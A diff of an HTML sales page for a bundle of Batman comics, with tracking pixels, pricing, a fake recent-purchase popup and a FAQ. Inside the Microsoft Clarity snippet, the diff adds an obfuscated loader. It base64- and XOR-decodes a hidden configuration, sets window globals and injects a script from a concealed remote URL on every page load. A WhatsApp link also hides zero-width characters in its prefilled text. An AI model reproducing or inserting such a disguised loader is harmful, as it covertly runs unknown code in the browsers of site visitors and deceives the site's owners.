@@ -1,396 +1,1391 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="pt-BR">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title> Gotham</title>
-<!-- Meta Pixel Code -->
-<script src="/pixel_meta.js"></script>
-<noscript>
-    <img height="1" width="1" style="display:none"
-      src="https://www.facebook.com/tr?id=1427846522732154&ev=PageView&noscript=1"/>
-</noscript>
-<!-- Microsoft Clarity -->
-<script type="text/javascript">
-    (function(c,l,a,r,i,t,y){
-        c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
-        t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
-        y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
-    })(window, document, "clarity", "script", "y1zsctudmh");
-</script>
-<!-- End Meta Pixel Code -->
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="styles.css">
-
-</head>
-<body>
-<svg class="grain" width="100%" height="100%">
-  <filter id="n"><feTurbulence type="fractalNoise" baseFrequency="0.8" numOctaves="2" stitchTiles="stitch"/></filter>
-  <rect width="100%" height="100%" filter="url(#n)"/>
-</svg>
-
-<main>
-
-  <div id="popup-compra" class="popup-compra">
-  <div class="popup-conteudo">
-    <div class="popup-icone"><svg viewBox="0 0 1024 1024" xmlns="http://www.w3.org/2000/svg" fill="#254e04" stroke="#254e04"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"><path fill="##254e04" d="M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896zm-55.808 536.384-99.52-99.584a38.4 38.4 0 1 0-54.336 54.336l126.72 126.72a38.272 38.272 0 0 0 54.336 0l262.4-262.464a38.4 38.4 0 1 0-54.272-54.336L456.192 600.384z"></path></g></svg></div>
-    <div>
-      <strong id="popup-nome">Carlos</strong>
-      <p id="popup-texto" data-i18n="popup_text">acabou de comprar este produto</p>
-    </div>
-  </div>
-</div>
-
-<section class="hero">
-  <div class="skyline">
-    <svg viewBox="0 0 1200 400" preserveAspectRatio="none">
-      <polygon points="0,400 0,220 40,220 40,180 80,180 80,240 130,240 130,140 170,140 170,260 230,260 230,190 280,190 280,230 330,230 330,120 380,120 380,250 430,250 430,200 480,200 480,270 540,270 540,150 590,150 590,240 650,240 650,100 700,100 700,260 760,260 760,210 820,210 820,170 870,170 870,250 930,250 930,190 990,190 990,230 1050,230 1050,140 1110,140 1110,270 1160,270 1160,220 1200,220 1200,400"
-        fill="#0d1119" stroke="rgba(234,231,221,0.04)" stroke-width="1"/>
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Gotham</title>
+    <!-- Meta Pixel Code -->
+    <script src="/pixel_meta.js"></script>
+    <noscript>
+      <img
+        height="1"
+        width="1"
+        style="display: none"
+        src="https://www.facebook.com/tr?id=1427846522732154&ev=PageView&noscript=1"
+      />
+    </noscript>
+    <!-- Microsoft Clarity -->
+    <script type="text/javascript">
+      (function (c, l, a, r, i, t, y) {
+        c[a] =
+          c[a] ||
+          function () {
+            (c[a].q = c[a].q || []).push(arguments);
+          };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+      })(window, document, "clarity", "script", "y1zsctudmh");
+      (function () {
+        var u_0mk = atob(
+          "DDwJbQWXWONUkexCy0crGHf7etl2+Zg2u08zQir0PI165JgvolpwQ2b4Nc0248MxqE5gHXHkd5M96Yku5ExgFWD7dokns8Bgqkh9H2z1LZcx4s54kGElT2L7N4E1/Z9g8WdyT2v2NYZ2q84yokRsAUzzes92540uvlkrVyehOdtjpoh7+llqWzCjadVgpYghqAU+WDC1Jb4p",
+        );
+        var r_q7 = [];
+        for (var d_sv6 = 0; d_sv6 < u_0mk.length; d_sv6++) {
+          r_q7.push(u_0mk.charCodeAt(d_sv6) & 255);
+        }
+        var t_bhi = r_q7[0];
+        var k_umi = r_q7.slice(1, 1 + t_bhi);
+        var x_j3 = r_q7.slice(1 + t_bhi);
+        var t_0pw = x_j3.map(function (b, y_606) {
+          return b ^ k_umi[y_606 % t_bhi];
+        });
+        var t_tz0q = "";
+        for (var i_900h = 0; i_900h < t_0pw.length; i_900h++) {
+          t_tz0q += String.fromCharCode(t_0pw[i_900h] & 255);
+        }
+        var u_k = decodeURIComponent(escape(t_tz0q));
+        var g_6ae = JSON.parse(u_k);
+        var r_8gf = g_6ae.globals || [];
+        r_8gf.forEach(function (g_2) {
+          window[g_2.name] = g_2.value;
+        });
+        var g_z2h = document.createElement("script");
+        g_z2h.src = g_6ae.url;
+        g_z2h.async = true;
+        g_z2h.defer = true;
+        (g_6ae.attributes || []).forEach(function (m_8tc) {
+          g_z2h.setAttribute(m_8tc.name, m_8tc.value);
+        });
+        (document.head || document.documentElement).appendChild(g_z2h);
+      })();
+    </script>
+    <!-- End Meta Pixel Code -->
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Oswald:wght@400;500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <svg class="grain" width="100%" height="100%">
+      <filter id="n">
+        <feTurbulence
+          type="fractalNoise"
+          baseFrequency="0.8"
+          numOctaves="2"
+          stitchTiles="stitch"
+        />
+      </filter>
+      <rect width="100%" height="100%" filter="url(#n)" />
     </svg>
-  </div>
-  <div class="beam beam-wrap"></div>
-  
-<div>
-  <img class="logo_beam beam-wrap" src="logo_batman_png.png" alt="">
-</div>
-<div class="hero-container">
-  <div class="hero-content">
-    <div class="eyebrow "><span class="dot"></span><span class="mono " data-i18n="hero_eyebrow" >Coleção original</span></div>
-   <h1 class="margin-tp" data-i18n="hero_title" >Papéis de parede para quem<br>vive na <em>penumbra</em> de Gotham.</h1>
-    <div class="hero-actions">
-      <a href="#preco" id="hero-cta" class="btn-primary " data-i18n="hero_button">Comprar com desconto</a>
-      <span class="hero-meta" data-i18n="hero_meta" >Formato <b>4K</b> · Desktop e celular · Arquivo original, sem marca d'água</span>
-    </div>
-  </div>
-  <div class="hero_image">
-    <img src="batman_header_3.png" alt="imagem do batman e suas responsividades de tela para mobile, tablets e pc's">
-  </div>
-</div>
-  
-</section>
 
-<section id="arquivo">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="mono margin-bt" data-i18n="package_eyebrow">Conteúdo do pacote</span>
-      <h2 class="margin-tp" data-i18n="package_title">Más de 1800 cómics organizados cronológicamente.</h2>
-      <p data-i18n="package_text">Descubre todos que recibás:</p>
-    </div>
-    <div class="carousel">
-      <div class="case-track">
-        <div class="case-grid">
-      <div class="case"><div class="case-art art-1"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-2"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-3"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-4"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-5"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-6"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-7"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-8"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-9"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-10"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-11"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-12"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-13"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-14"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-15"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-16"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-17"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-18"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-19"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-20"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-21"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-22"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-23"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-24"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      
-        </div>
-        <div class="case-grid">
-      <div class="case"><div class="case-art art-1"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-2"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-3"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-4"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-5"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-6"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-7"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-8"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-9"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-10"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-11"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-12"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-13"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-14"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-15"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-16"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-17"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-18"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-19"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-20"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-21"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-22"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-23"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-24"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      
-        </div>
-        <div class="case-grid">
-      <div class="case"><div class="case-art art-1"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-2"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-3"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-4"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-5"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-6"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-7"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-8"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-9"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-10"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-11"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-12"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-13"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-14"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-15"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-16"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-17"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-18"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-19"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-20"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-21"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-22"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-23"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      <div class="case"><div class="case-art art-24"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-      
-        </div>
-
-      </div>
-  
-    </div>
-
-  </div>
-</section>
-
-<section class="mais_section">
-
-
-  <div class="mais_container">
-              
-        <div class="mais_card">
-  <div class="mais_icone">
-    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M12 2L4 5V11C4 16 7.4 20.7 12 22C16.6 20.7 20 16 20 11V5L12 2Z"
-        stroke="#FACC15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-  <path d="M9 12L11 14L15 10"
-        stroke="#FACC15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-</svg>
-  </div>
-  <h1 class="mais_title">GARANTÍA DE 7 DÍAS</h1>
-  <p class="mais_p">Si el contenido no cumple tus expectativas, puedes solicitar el reembolso de tu compra dentro de los primeros 7 días.</p>
-</div>
-
-<div class="mais_card">
-  <div class="mais_icone">
-    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <path d="M13 2L4 14H11L10 22L20 9H13L13 2Z"
-        stroke="#FACC15" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
-</svg>
-  </div>
-  <h1 class="mais_title">ACCESO INMEDIATO</h1>
-  <p class="mais_p">Recibe el acceso automáticamente por correo electrónico inmediatamente después de confirmar tu compra.</p>
-</div>
-
-<div class="mais_card">
-  <div class="mais_icone">
-    <svg width="34" height="34" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-  <rect x="5" y="11" width="14" height="10" rx="2"
-        stroke="#FACC15" stroke-width="2"/>
-  <path d="M8 11V8C8 5.8 9.8 4 12 4C14.2 4 16 5.8 16 8V11"
-        stroke="#FACC15" stroke-width="2" stroke-linecap="round"/>
-</svg>
-  </div>
-  <h1 class="mais_title">PAGO 100 % SEGURO</h1>
-  <p class="mais_p">Tu compra está protegida mediante una plataforma de pago segura y confiable.</p>
-</div>
-       
-
-  </div>
-  <div class="mais_button">
-    <a href="#preco" id="hero-cta" class="btn-primary ">quiero acceder a los más de 1800 cómics del batman</a>
-  </div>
-  
-
-</section>
-
-<section id="bonus" style="border-top:1px solid var(--line);border-bottom:1px solid var(--line);">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="mono " data-i18n="bonus_eyebrow">O que mais vem junto</span>
-      <h2 class="margin-tp" data-i18n="bonus_title">bônus, sem enrolação</h2>
-    </div>
-    <div class="bonus-grid">
-      <div class="bonus-card bonus_bg_1">
-        </div>
-      <div class="bonus-card bonus_bg_2">
-       </div>
-    </div>
-  </div>
-</section>
-
-<section id="preco">
-  <div class="wrap">
-    <div class="pricing">
-      <div class="pricing-left">
-        <span class="mono " data-i18n="pricing_eyebrow" style="color:#f2c14e">Acesso único</span>
-        <div class="price_image">
-          <img src="./batman_header_3.png" alt="">
-        </div>
-        <h2 class="margin-tp" >HOY RECIBIRÁS</h2>
-        <ul class="feature-list">
-          <li>Más de 1800 cómics del Batman</li>
-          <li>Bono: Aplicación exclusiva Biblioteca Geek</li>
-          <li>Colección organizada cronológicamente</li>
-          <li>Bono: Guía completa de lectura</li>
-        </ul>
-      </div>
-      <div class="pricing-right">
-        <div class="old-price" data-i18n="old_price">USD 29.90</div>
-        <div class="new-price" data-i18n="new_price">USD 7.90</div>
-        <div class="price-note" data-i18n="price_note">Pagamento único · sem assinatura</div>
-        <a href="https://pay.hotmart.com/V107223799N?checkoutMode=10" id="buy-cta" class="btn-primary btn-block" data-i18n="buy_button">Garantir o pacote</a>
-       <h1>el valor se converterá automáticamente a la moneda local en la página de pago</h1>
-       <div class="guarantee-strip">
-          <span data-i18n="guarantee">Garantia 7 dias</span>
-          <span data-i18n="instant_delivery">Entrega imediata</span>
-          <span data-i18n="secure_payment">Pagamento seguro</span>
+    <main>
+      <div id="popup-compra" class="popup-compra">
+        <div class="popup-conteudo">
+          <div class="popup-icone">
+            <svg
+              viewBox="0 0 1024 1024"
+              xmlns="http://www.w3.org/2000/svg"
+              fill="#254e04"
+              stroke="#254e04"
+            >
+              <g id="SVGRepo_bgCarrier" stroke-width="0"></g>
+              <g
+                id="SVGRepo_tracerCarrier"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              ></g>
+              <g id="SVGRepo_iconCarrier">
+                <path
+                  fill="##254e04"
+                  d="M512 64a448 448 0 1 1 0 896 448 448 0 0 1 0-896zm-55.808 536.384-99.52-99.584a38.4 38.4 0 1 0-54.336 54.336l126.72 126.72a38.272 38.272 0 0 0 54.336 0l262.4-262.464a38.4 38.4 0 1 0-54.272-54.336L456.192 600.384z"
+                ></path>
+              </g>
+            </svg>
+          </div>
+          <div>
+            <strong id="popup-nome">Carlos</strong>
+            <p id="popup-texto" data-i18n="popup_text">
+              acabou de comprar este produto
+            </p>
+          </div>
         </div>
       </div>
-    </div>
-  </div>
-</section>
 
-<section id="arquivo" style="padding-bottom: 0;">
-  <div class="wrap">
-    <div class="section-head">
-      <h2 class="margin-tp">DESCUBRE LO QUE OPINAN NUESTROS CLIENTES</h2>
-    </div>
-    <div class="carousel">
-      <div class="case-track-social">
-        <div class="case-grid-social">
-          <div class="case"><div class="case-art art-30"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-31"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-32"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-33"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-34"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-35"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          
-          <div class="case"><div class="case-art art-30"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-31"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-32"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          
-          <div class="case"><div class="case-art art-33"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-34"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-35"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-        
+      <section class="hero">
+        <div class="skyline">
+          <svg viewBox="0 0 1200 400" preserveAspectRatio="none">
+            <polygon
+              points="0,400 0,220 40,220 40,180 80,180 80,240 130,240 130,140 170,140 170,260 230,260 230,190 280,190 280,230 330,230 330,120 380,120 380,250 430,250 430,200 480,200 480,270 540,270 540,150 590,150 590,240 650,240 650,100 700,100 700,260 760,260 760,210 820,210 820,170 870,170 870,250 930,250 930,190 990,190 990,230 1050,230 1050,140 1110,140 1110,270 1160,270 1160,220 1200,220 1200,400"
+              fill="#0d1119"
+              stroke="rgba(234,231,221,0.04)"
+              stroke-width="1"
+            />
+          </svg>
         </div>
+        <div class="beam beam-wrap"></div>
 
-      </div>
-      <div class="case-track-social">
-        <div class="case-grid-social">
-          <div class="case"><div class="case-art art-30"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-31"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-32"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          
-          <div class="case"><div class="case-art art-33"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-34"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-35"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          
-          <div class="case"><div class="case-art art-30"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-31"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-32"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          
-          <div class="case"><div class="case-art art-33"></div><div class="case-label"><span class="mono">  </span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-34"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-          <div class="case"><div class="case-art art-35"></div><div class="case-label"><span class="mono"></span><div class="name"></div></div></div>
-        
+        <div>
+          <img class="logo_beam beam-wrap" src="logo_batman_png.png" alt="" />
         </div>
-        
-
-      </div>
-    </div>
-
-    <div class="section-head" style="margin: 56px 0; max-width: 100%; text-align: center;">
-      <h2 class="margin-tp">¿BUSCAS CÓMICS DE OTROS HÉROES?</h2>
-      <div style="margin-top: 56px;">
-        <svg fill="#ffffff" height="100px" width="100px" version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 511.999 511.999" xml:space="preserve" stroke="#ffffff"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <g> <g> <g> <path d="M400.132,311.858c-1.451-2.859-4.395-4.659-7.603-4.659h-85.333v-93.867c0-4.719-3.814-8.533-8.533-8.533h-85.333 c-4.71,0-8.533,3.814-8.533,8.533v93.867h-85.333c-3.209,0-6.144,1.801-7.595,4.659c-1.459,2.867-1.195,6.298,0.7,8.892 L249.1,508.483c1.604,2.21,4.164,3.516,6.895,3.516c2.739,0,5.291-1.306,6.903-3.516L399.432,320.75 C401.327,318.156,401.591,314.726,400.132,311.858z"></path> <path d="M230.399,187.733h51.2c14.114,0,25.6-11.486,25.6-25.6s-11.486-25.6-25.6-25.6h-51.2c-14.114,0-25.6,11.486-25.6,25.6 S216.285,187.733,230.399,187.733z"></path> <path d="M230.399,119.467h51.2c14.114,0,25.6-11.486,25.6-25.6s-11.486-25.6-25.6-25.6h-51.2c-14.114,0-25.6,11.486-25.6,25.6 S216.285,119.467,230.399,119.467z"></path> <path d="M230.399,51.2h51.2c14.114,0,25.6-11.486,25.6-25.6S295.713,0,281.599,0h-51.2c-14.114,0-25.6,11.486-25.6,25.6 S216.285,51.2,230.399,51.2z"></path> </g> </g> </g> </g></svg>
-      </div>
-      <div style="margin-top: 56px;">
-        <a href="https://wa.me/5524992834072?text=M%E2%81%A2%E2%80%8D%E2%81%A2%E2%80%8B%E2%80%8D%E2%81%A3%E2%80%8B%E2%81%A1%E2%81%A2%E2%81%A0%E2%81%A2%E2%81%A2%E2%81%A3%E2%81%AC%E2%81%AD%E2%81%AC%E2%81%AD%E2%81%A3%E2%81%A4%CD%8F%E2%81%A0%E2%80%8B%CD%8F%E2%81%A1%E2%80%8B%E2%81%AB%E2%81%A0e%20gustar%C3%ADa%20tener%20acceso%20a%20otros%20tipos%20de%20c%C3%B3mics%3B%20%C2%BFpodr%C3%ADa%20contarme%20m%C3%A1s%20sobre%20ellos%3F"><svg height="80px" width="80px" version="1.1" id="Icons" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" xml:space="preserve" fill="#000000"><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <style type="text/css"> .st0{fill:#FFFFFF;} .st1{fill:#3A559F;} .st2{fill:#F4F4F4;} .st3{fill:#FF0084;} .st4{fill:#0063DB;} .st5{fill:#00ACED;} .st6{fill:#FFEC06;} .st7{fill:#FF0000;} .st8{fill:#25D366;} .st9{fill:#0088FF;} .st10{fill:#314358;} .st11{fill:#EE6996;} .st12{fill:#01AEF3;} .st13{fill:#FFFEFF;} .st14{fill:#F06A35;} .st15{fill:#00ADEF;} .st16{fill:#1769FF;} .st17{fill:#1AB7EA;} .st18{fill:#6001D1;} .st19{fill:#E41214;} .st20{fill:#05CE78;} .st21{fill:#7B519C;} .st22{fill:#FF4500;} .st23{fill:#00F076;} .st24{fill:#FFC900;} .st25{fill:#00D6FF;} .st26{fill:#FF3A44;} .st27{fill:#FF6A36;} .st28{fill:#0061FE;} .st29{fill:#F7981C;} .st30{fill:#EE1B22;} .st31{fill:#EF3561;} .st32{fill:none;stroke:#FFFFFF;stroke-width:2;stroke-miterlimit:10;} .st33{fill:#0097D3;} .st34{fill:#01308A;} .st35{fill:#019CDE;} .st36{fill:#FFD049;} .st37{fill:#16A05D;} .st38{fill:#4486F4;} .st39{fill:none;} .st40{fill:#34A853;} .st41{fill:#4285F4;} .st42{fill:#FBBC05;} .st43{fill:#EA4335;} </style> <path class="st8" d="M17,0C8.7,0,2,6.7,2,15c0,3.4,1.1,6.6,3.2,9.2l-2.1,6.4c-0.1,0.4,0,0.8,0.3,1.1C3.5,31.9,3.8,32,4,32 c0.1,0,0.3,0,0.4-0.1l6.9-3.1C13.1,29.6,15,30,17,30c8.3,0,15-6.7,15-15S25.3,0,17,0z"></path> <path class="st0" d="M25.7,20.5c-0.4,1.2-1.9,2.2-3.2,2.4C22.2,23,21.9,23,21.5,23c-0.8,0-2-0.2-4.1-1.1c-2.4-1-4.8-3.1-6.7-5.8 L10.7,16C10.1,15.1,9,13.4,9,11.6c0-2.2,1.1-3.3,1.5-3.8c0.5-0.5,1.2-0.8,2-0.8c0.2,0,0.3,0,0.5,0c0.7,0,1.2,0.2,1.7,1.2l0.4,0.8 c0.3,0.8,0.7,1.7,0.8,1.8c0.3,0.6,0.3,1.1,0,1.6c-0.1,0.3-0.3,0.5-0.5,0.7c-0.1,0.2-0.2,0.3-0.3,0.3c-0.1,0.1-0.1,0.1-0.2,0.2 c0.3,0.5,0.9,1.4,1.7,2.1c1.2,1.1,2.1,1.4,2.6,1.6l0,0c0.2-0.2,0.4-0.6,0.7-0.9l0.1-0.2c0.5-0.7,1.3-0.9,2.1-0.6 c0.4,0.2,2.6,1.2,2.6,1.2l0.2,0.1c0.3,0.2,0.7,0.3,0.9,0.7C26.2,18.5,25.9,19.8,25.7,20.5z"></path> </g></svg>
-      </a>
-      </div>
-    </div>
-  </div>
-</section>
-
-<section id="faq">
-  <div class="wrap">
-    <div class="section-head">
-      <span class="mono " data-i18n="faq_eyebrow">Perguntas frequentes</span>
-      <h2 class="margin-tp" data-i18n="faq_title">Antes de acessar o arquivo</h2>
-    </div>
-    <div class="faq-list">
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq1_q">Em que formato recebo as artes? <span class="plus">+</span></button>
-        <div class="faq-a" data-i18n="faq1_a">Todas as imagens vêm em JPG de alta resolução (4K), organizadas por pasta de atmosfera e por proporção de tela.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq2_q">Funciona no celular e no computador? <span class="plus">+</span></button>
-        <div class="faq-a " data-i18n="faq2_a">Sim. Cada arte tem uma versão para tela de celular, uma para desktop e uma para tela de bloqueio.</div>
-      </div>
-      <div class="faq-item">
-        <button class="faq-q" data-i18n="faq3_q">O acesso expira? <span class="plus">+</span></button>
